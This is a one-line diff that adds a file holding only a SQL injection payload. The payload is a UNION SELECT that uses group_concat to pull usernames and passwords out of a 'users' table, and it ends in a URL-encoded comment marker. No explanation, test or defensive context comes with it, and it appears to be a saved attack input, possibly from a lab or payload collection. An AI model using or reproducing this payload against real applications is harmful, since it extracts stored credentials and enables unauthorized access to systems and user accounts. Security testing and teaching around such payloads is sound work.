@@ -1,0 +1,1 @@
+1' UNION SELECT group_concat(user, 0x3a, password), 1 FROM users%23
